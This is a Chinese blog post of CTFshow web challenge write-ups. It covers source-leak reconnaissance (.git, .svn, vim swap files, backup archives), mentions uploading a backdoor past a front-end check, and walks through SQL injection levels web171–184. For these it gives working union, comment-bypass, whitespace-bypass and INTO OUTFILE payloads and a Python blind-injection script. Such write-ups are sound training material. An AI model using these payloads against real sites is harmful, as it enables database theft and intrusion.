<!DOCTYPE html>
<html lang="en">
  <head><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="222222"/><link rel="alternate" href="/atom.xml" title="K1rit0's Blog" type="application/atom+xml"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
<link rel="canonical" href="http://tearsjin.github.io/page/5/"/>

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" /><script type="text/x-mathjax-config">
    MathJax.Hub.Config({ tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] } });
  </script>
  <script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"></script>
<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />

<script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":true};
</script>

    <title>K1rit0's Blog</title>
  <meta name="generator" content="Hexo 5.4.0"></head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">K1rit0's Blog</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/">
        <li class="mobile-menu-item">Home
          </li>
      </a><a href="/archives/">
        <li class="mobile-menu-item">Archives
          </li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags
          </li>
      </a><a href="/categories/">
        <li class="mobile-menu-item">Categories
          </li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">K1rit0's Blog</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/">
            Home
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/archives/">
            Archives
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/tags/">
            Tags
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/categories/">
            Categories
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/about/">
            About
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><section id="posts" class="posts"><article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2020/12/12/CTFshow-Web1000/">CTFshow Web1000</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2020-12-12
        </span><span class="post-category">
            <a href="/categories/WebSummary/">WebSummary</a>
            </span>
        </div>
    </header>

    <div class="post-content"><blockquote>
<p>重金买了个号怎么可能不做呢???<br>好好学学Web了 真的很重要!</p>
</blockquote>
<h1 id="信息搜集-Web1-20"><a href="#信息搜集-Web1-20" class="headerlink" title="信息搜集 Web1~20"></a>信息搜集 Web1~20</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web 1"></a>Web 1</h2><p>F12</p>
<h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web 2"></a>Web 2</h2><p>没办法F12和右键了, 直接firefox开发者工具</p>
<h2 id="Web-3"><a href="#Web-3" class="headerlink" title="Web 3"></a>Web 3</h2><p>抓包, flag就在响应里</p>
<blockquote>
<p>所以有时候没思路就抓抓包, 有可能有线索或者提示的</p>
</blockquote>
<h2 id="Web-4"><a href="#Web-4" class="headerlink" title="Web 4"></a>Web 4</h2><p>robots.txt</p>
<blockquote>
<p>所以没思路的时候就阿巴阿巴</p>
</blockquote>
<h2 id="Web-5"><a href="#Web-5" class="headerlink" title="Web 5"></a>Web 5</h2><p>phps源码泄露</p>
<blockquote>
<p>有时候试试phps读源码, 有惊喜哦</p>
</blockquote>
<h2 id="Web-6"><a href="#Web-6" class="headerlink" title="Web 6"></a>Web 6</h2><p>也是源码泄露, 应该是备份压缩包<br>常见的名字有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#39;www.zip&#39;,</span><br><span class="line">&#39;www.bak&#39;,</span><br><span class="line">&#39;www.rar&#39;,</span><br><span class="line">&#39;www.7z&#39;,</span><br><span class="line">&#39;www.tar&#39;,</span><br><span class="line">&#39;www.tar.gz&#39;,</span><br><span class="line">&#39;www.txt&#39;</span><br></pre></td></tr></table></figure>

<h2 id="Web-7"><a href="#Web-7" class="headerlink" title="Web 7"></a>Web 7</h2><h3 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h3><p>漏洞成因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p>
<p>一般来说就是.git泄露之后恢复源码什么的.</p>
<p>有时候还会需要用.git/config 中含有的access_token信息, 从而访问这个用户的其他仓库</p>
<p>有些时候访问.git会返回403, 这个时候就要试探的访问.git/config, 如果有内容返回, 就说明存在git泄露.</p>
<p>关于敏感目录泄露, 还有SVN泄露, HG泄露等等… 等以后遇到了再来总结</p>
<h2 id="Web-8"><a href="#Web-8" class="headerlink" title="Web 8"></a>Web 8</h2><h3 id="SVN-泄露"><a href="#SVN-泄露" class="headerlink" title="SVN 泄露"></a>SVN 泄露</h3><p>SVN(subversion)是一个源代码版本管理软件. 同样的隐藏文件.SVN里面会有信息. </p>
<p>利用seay-svn获取服务器源码等信息</p>
<h2 id="Web-9"><a href="#Web-9" class="headerlink" title="Web 9"></a>Web 9</h2><h3 id="vim备份文件泄露"><a href="#vim备份文件泄露" class="headerlink" title="vim备份文件泄露"></a>vim备份文件泄露</h3><p>当用户在用vim编辑文件但意外退出时, 会在当前目录下生成一个备份文件, 文件名格式为<code>.文件名.swp</code></p>
<p>针对swp备份文件, 可以用<code>vim -r</code>命令恢复文件的内容.</p>
<h2 id="Web-10"><a href="#Web-10" class="headerlink" title="Web 10"></a>Web 10</h2><p>Cookies里面有内容</p>
<blockquote>
<p>抓包分析的时候一般都会看看Cookies的</p>
</blockquote>
<h2 id="Web-11"><a href="#Web-11" class="headerlink" title="Web 11"></a>Web 11</h2><p>域名解析<br><a target="_blank" rel="noopener" href="http://dbcha.com/">http://dbcha.com/</a> 里面查ctfshow.com的txt记录</p>
<blockquote>
<p>顺便学习一下域名解析的类型</p>
</blockquote>
<h3 id="域名解析类型-A-CNAME-MX-NS-TXT-AAAA-SRV-显性URL-隐性URL"><a href="#域名解析类型-A-CNAME-MX-NS-TXT-AAAA-SRV-显性URL-隐性URL" class="headerlink" title="域名解析类型: A/CNAME/MX/NS/TXT/AAAA/SRV/显性URL/隐性URL"></a>域名解析类型: A/CNAME/MX/NS/TXT/AAAA/SRV/显性URL/隐性URL</h3><p><strong>A记录</strong>：将域名指向一个IPv4地址（例如：10.10.10.10），需要增加A记录<br><strong>CNAME记录</strong>：如果将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加CNAME记录<br><strong>MX记录</strong>：建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录<br><strong>NS记录</strong>：域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录<br><strong>TXT记录</strong>：可任意填写（可为空），通常用做SPF记录（反垃圾邮件）使用<br><strong>AAAA记录</strong>：将主机名（或域名）指向一个IPv6地址（例如：ff03:0:0:0:0:0:0:c1），需要添加AAAA记录<br><strong>SRV记录</strong>：记录了哪台计算机提供了哪个服务。格式为：服务的名字.协议的类型（例如：_example-server._tcp）<br><strong>显性URL</strong>：将域名指向一个http(s)协议地址，访问域名时，自动跳转至目标地址（例如：将<a href="http://www.net.cn显性转发到www.hichina.com后，访问www.net.cn时，地址栏显示的地址为：www.hichina.com）。">www.net.cn显性转发到www.hichina.com后，访问www.net.cn时，地址栏显示的地址为：www.hichina.com）。</a><br><strong>隐性URL</strong>：与显性URL类似，但隐性转发会隐藏真实的目标地址（例如：将<a href="http://www.net.cn隐性转发到www.hichina.com后，访问www.net.cn时，地址栏显示的地址仍然为：www.net.cn）。">www.net.cn隐性转发到www.hichina.com后，访问www.net.cn时，地址栏显示的地址仍然为：www.net.cn）。</a></p>
<h2 id="Web-12"><a href="#Web-12" class="headerlink" title="Web 12"></a>Web 12</h2><blockquote>
<p>开始变得奇怪了</p>
</blockquote>
<p>进去是一个购物网站, 抓包无果, 看了下robots.txt, 有提示/admin/<br>要输入账号密码, 账号就是admin, 密码是网站下面的那串数字</p>
<blockquote>
<p>正常情况下没有人会这么干吧!<br>所以还是要多去看看一下可以搜集信息的地方, robotx.txt啥的</p>
</blockquote>
<h2 id="Web-13"><a href="#Web-13" class="headerlink" title="Web 13"></a>Web 13</h2><p>拿到一个网站可以看看看看有哪些链接是可以跳转的(哪些是可以点击的)<br>网站下面有个document可以点, 进去以后里面有后台的地址和用户名密码.</p>
<h2 id="Web-14"><a href="#Web-14" class="headerlink" title="Web 14"></a>Web 14</h2><blockquote>
<p>KindEditor PHP编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录</p>
</blockquote>
<p>进入/editor/(这个得目录扫描吧… 利用上传图片遍历服务器根目录, 在网站目录下找到/nothinghere/fl000g.txt</p>
<h2 id="Web-15"><a href="#Web-15" class="headerlink" title="Web 15"></a>Web 15</h2><p>目录下有admin/<br>忘记密码需要填写密保<br>而网站下方有qq邮箱, 搜索qq可以知道密保答案</p>
<h2 id="Web-16"><a href="#Web-16" class="headerlink" title="Web 16"></a>Web 16</h2><p>考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针.</p>
<h2 id="Web-17"><a href="#Web-17" class="headerlink" title="Web 17"></a>Web 17</h2><p>利用ping 直接获得某个域名所对应的ip</p>
<h2 id="Web-18"><a href="#Web-18" class="headerlink" title="Web 18"></a>Web 18</h2><p>js代码审计, 找到游戏结果的判断就能找到线索</p>
<h2 id="Web-19"><a href="#Web-19" class="headerlink" title="Web 19"></a>Web 19</h2><p>AES加密, 但是Key iv mode padmode都在前端….<br>利用<a target="_blank" rel="noopener" href="http://tool.chacuo.net/cryptaes%E8%A7%A3%E5%AF%86%E5%8D%B3%E5%8F%AF">http://tool.chacuo.net/cryptaes解密即可</a></p>
<h1 id="文件上传-web151-web170"><a href="#文件上传-web151-web170" class="headerlink" title="文件上传 web151 ~ web170"></a>文件上传 web151 ~ web170</h1><p>前端验证上传文件后缀名, 只需要抓包改一下文件名称就能上传后门了                                                                                                                        通过ls找到flag.php , cat flag.php即可</p>
<h1 id="sql注入-web171-web253"><a href="#sql注入-web171-web253" class="headerlink" title="sql注入 web171~ web253"></a>sql注入 web171~ web253</h1><h2 id="web-171"><a href="#web-171" class="headerlink" title="web 171"></a>web 171</h2><p>语句: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure>

<p>直接在本表内爆出所有数据即可,  payload: <code>id= 1&#39; or 1 --+</code></p>
<h2 id="web-172"><a href="#web-172" class="headerlink" title="web 172"></a>web 172</h2><p>语句<code>$sql = &quot;select username,password from ctfshow_user2 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p>
<p>但是输出经过了过滤:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if($row-&gt;username!&#x3D;&#x3D;&#39;flag&#39;)&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以需要把返回出来的username改掉, 让他检查不出来, payload: <code>1&#39; union select 1,password from ctfshow_user2 where username = &#39;flag&#39;  --+</code></p>
<h2 id="web-173"><a href="#web-173" class="headerlink" title="web 173"></a>web 173</h2><p>语句:<code>$sql = &quot;select id,username,password from ctfshow_user3 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p>
<p>返回逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>这里直接对结果进行过滤, 需要让返回的结果不存在flag, 考虑将返回的结果全部转成十六进制</p>
<p>payload: <code>0&#39; union select 1,hex(username),hex(password) from ctfshow_user3 where username = &#39;flag&#39; --+</code></p>
<p>然后将返回的结果转成text即可,  但是出来flag的时候发现, 其实根本不需要转成16进制, 因为flag里根本就没有<code>flag</code>字样(ctfshow{3354c0bf-e7ab-4e26-9990-b5679766170d}), 所以直接<code>0&#39; union select 1,2,password from ctfshow_user3 where username = &#39;flag&#39; --+</code> 也能出结果</p>
<h2 id="web-174"><a href="#web-174" class="headerlink" title="web 174"></a>web 174</h2><p>语句: <code> $sql = &quot;select username,password from ctfshow_user4 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p>
<p>返回逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>这下好了, 结果里连数字都不能出现了, hex(), base64()估计都不能用了, 想个办法把数字转成别的字符,  <code>replace(str1,str2,str3)</code> 可以把<code>str1</code>中的<code>str2</code>替换成<code>str3</code>, 可以考虑用这个将所有数字换成大写字母(毕竟flag中是没有大写字母的, 没有找到sql用正则的方法, 只能把多个replace()套在一起了</p>
<p>payload:<code>0&#39; union select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&#39;1&#39;,&#39;A&#39;),&#39;2&#39;,&#39;B&#39;),&#39;3&#39;,&#39;C&#39;),&#39;4&#39;,&#39;D&#39;),&#39;5&#39;,&#39;E&#39;),&#39;6&#39;,&#39;F&#39;),&#39;7&#39;,&#39;G&#39;),&#39;8&#39;,&#39;H&#39;),&#39;9&#39;,&#39;I&#39;),&#39;0&#39;,&#39;J&#39;) from ctfshow_user4 where username = &#39;flag&#39; --+</code></p>
<p>然后将返回的结果中的大写字母转回数字就行了</p>
<h2 id="web-175"><a href="#web-175" class="headerlink" title="web 175"></a>web 175</h2><p>语句:<code>$sql = &quot;select username,password from ctfshow_user5 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p>
<p>返回逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;[\x00-\x7f]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>已经不能返回任何东西了, \x00~\x7f全部过滤掉了, 考虑文件的方式读取flag. 用<code>INTO OUTFILE</code> 可以将查询结果输出到某文件中, 在这里只需要输出到一个文件里就行了, 不过路径要记得写对<code>var\www\html\</code></p>
<p>payload: <code>1&#39; union select username,password from ctfshow_user5 where username=&#39;flag&#39; into outfile &#39;/var/www/html/res.txt&#39;--+</code></p>
<p>结果就在res.txt里</p>
<h2 id="web-176"><a href="#web-176" class="headerlink" title="web 176"></a>web 176</h2><p>开始有过滤了</p>
<p>语句:<code>$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p>
<p>返回逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">   &#x2F;&#x2F;代码过于简单，不宜展示</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>只知道有过滤, 但不知道过滤了啥, 也没多想先试试<code>1&#39; or 1 --+</code>就出flag了, 看群主的视频这题应该是大小写绕过</p>
<h2 id="web-177"><a href="#web-177" class="headerlink" title="web 177"></a>web 177</h2><p>语句<code>$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code>                     </p>
<p>返回逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">   &#x2F;&#x2F;代码过于简单，不宜展示</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>一样是过滤, 继续尝试<code>1&#39; or 1 --+</code>, 发现无结果, 应该是某些字符被过滤了. 这个时候因为不知道什么被过滤, 所以输入越少东西越能判断出过滤了什么.</p>
<p>先尝试<code>1&#39;--+</code> 发现无结果, 可能<code>--+</code>被过滤了, 尝试用<code>#</code> 也不行, 再试试<code>%23</code>, 发现可以绕过过滤</p>
<p>再尝试<code>1&#39; %23</code>又是无结果,明显是空格被过滤了, 利用<code>/**/</code>注释绕过空格.</p>
<p>于是得到一个payload: <code>1&#39;/**/or/**/1%23</code></p>
<h2 id="web-178-179"><a href="#web-178-179" class="headerlink" title="web 178 179"></a>web 178 179</h2><p>依旧是过滤掉了空格, 但是<code>/**/</code>不能使用了, 则尝试用括号来绕过</p>
<p>payload:<code>1&#39;or(1)%23</code> 简单粗暴</p>
<p>看了群主的视频发现还可以用<code>%09</code>来代替空格, 这个是制表符, 在sql中跟空格一样的作用</p>
<p>payload:<code>1&#39;%09or%091%23</code></p>
<p>然后在web 179里, <code>%09</code>也被过滤了, 第一个payload还是可以用的, 但还可以试试别的, 比如<code>%0a %0b %0c</code>等等, 把ascii码前面那几个字符都试一试, 试出<code>%0c</code>也是可以的</p>
<p>payload:<code>1&#39;%0cor%0c1%23</code> </p>
<h2 id="web-180"><a href="#web-180" class="headerlink" title="web 180"></a>web 180</h2><p>语句<code>$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p>
<p>跟前面的不同的是, 这次连<code>%23</code>都被过滤了, 可以说没办法注释掉后面的sql语句了, 只能通过闭合的方式使得语句不会出错</p>
<p>例如<code>1&#39;and&#39;a&#39;=&#39;a</code>, 这样语句就会变成</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> username <span class="operator">!=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span><span class="keyword">and</span><span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;a&#x27;</span> limit <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>可以看到引号被成功的闭合, 结果也是有的. 但是, 想要查出flag还需要想办法使得<code>username != &#39;flag&#39;无效</code>, 因<code>username != &#39;flag&#39;</code>与后面的条件关系是<code>and</code>, 所以并不能通过他原本的语句中的<code>id=</code>查<code>id = 26</code>找到flag(id=26是flag是因为前面的题目都是26), 所以需要构造一个新的与前面的条件的关系为<code>or</code>的条件来查找</p>
<p>所以考虑了<code>1&#39;or(1)and&#39;a</code>, 但是得到的结果却只有一行, 原因是因为语句中有个<code>limit 1</code>. 而原本语句中的<code>id=1</code>是可以查询出结果的, 这里不能让他查询出结果了, 而出来的结果又必须是flag那一条, 所以考虑将<code>or</code>括号中的条件改成<code>id=26</code>. 这样就成功构造出payload:<code>0&#39;or(id=26)and&#39;a&#39;=&#39;a</code></p>
<h2 id="web-181"><a href="#web-181" class="headerlink" title="web 181"></a>web 181</h2><p>语句<code>$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p>
<p>返回逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select&#x2F;i&#39;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>web 180的payload中的字符串这题都没有过滤掉, 直接<code>0&#39;or(id=26)and&#39;a&#39;=&#39;a</code>出结果</p>
<h2 id="web-182"><a href="#web-182" class="headerlink" title="web 182"></a>web 182</h2><p>和web 181一样, 直接<code>0&#39;or(id=26)and&#39;a&#39;=&#39;a</code></p>
<h2 id="web-183"><a href="#web-183" class="headerlink" title="web 183"></a>web 183</h2><p>查询语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接sql语句查找指定ID用户</span><br><span class="line">  $sql &#x3D; &quot;select count(pass) from &quot;.$_POST[&#39;tableName&#39;].&quot;;&quot;;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>返回逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\&#x3D;|or|\x7c|select|and|flag|into&#x2F;i&#39;, $str);</span><br><span class="line">  &#125;      </span><br></pre></td></tr></table></figure>

<p>查询结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;返回用户表的记录总数</span><br><span class="line">      $user_count &#x3D; 1;</span><br></pre></td></tr></table></figure>

<p>结果只会返回结果的数量, 而且过滤掉了很多关键字. 看了下视频, 这里要用到正则+盲注, sql中的正则是用REGEXP’str’来匹配的, 例如<code>select id from table where username REGXEP&#39;admin&#39;</code> 就会查询符合正则式子的username字段的那一行</p>
<p>这里因为可以知道结果有几行, 也就意味着可以判断正则是否匹配, 由前面的题目可以知道flag的格式是ctfshow{xxxx-xxx-x-x-x}这种, 而且只有小写字母和数字, 所以考虑用脚本盲注, 从<code>`ctfshow_user`where`pass`REGEXP&#39;ctfshow&#123;</code>开始猜flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://aba2e256-aa5c-4cf3-849f-b4f6d61fb78d.chall.ctf.show:8080/select-waf.php&#x27;</span></span><br><span class="line">Str = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;`ctfshow_user`where`pass`REGEXP&#x27;ctfshow&#123;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Str:</span><br><span class="line">        Data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: data[<span class="string">&#x27;tableName&#x27;</span>] + i + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url=url, data=Data)</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">&#x27;\$user_count = (\d)&#x27;</span>,resp.content.decode())[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            data[<span class="string">&#x27;tableName&#x27;</span>] += i</span><br><span class="line">            print(re.findall(<span class="string">&#x27;\$user_count = (\d)&#x27;</span>,resp.content.decode())[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>跑完就得到flag了</p>
<h2 id="web-184"><a href="#web-184" class="headerlink" title="web 184"></a>web 184</h2><p>查询语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接sql语句查找指定ID用户</span><br><span class="line">  $sql &#x3D; &quot;select count(*) from &quot;.$_POST[&#39;tableName&#39;].&quot;;&quot;;    </span><br></pre></td></tr></table></figure>

<p>返回逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>查询结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;返回用户表的记录总数</span><br><span class="line">      $user_count &#x3D; 0;</span><br></pre></td></tr></table></figure>

<p>这题连<code>where</code>都过滤掉了, 还剩下一个可以用来设定条件的<code>on</code>, 如果要用<code>on</code>的, 需要用到多表联合查询<code>JOIN</code>, 在两个表(依旧是同一个表)中查询, 生成的临时表中就可以用on</p>
<p>不管是<code>INNER JOIN</code>还是<code>LEFT JOIN</code>或者是<code>RIGHT JOIN</code>都无所谓, 只需要猜flag正确的时候回显不同即可,  因为这题没有过滤掉空格, 构造payload:<code>tableName=ctfshow_user as a inner join ctfshow_user as b on substr(b.pass,num,1)regexp(char(str))</code>, 其中num就是flag的位数, str就是猜测的字符 , 因为知道flag前缀是<code>ctfshow&#123;</code>, 所以从第9位开始猜就行了</p>
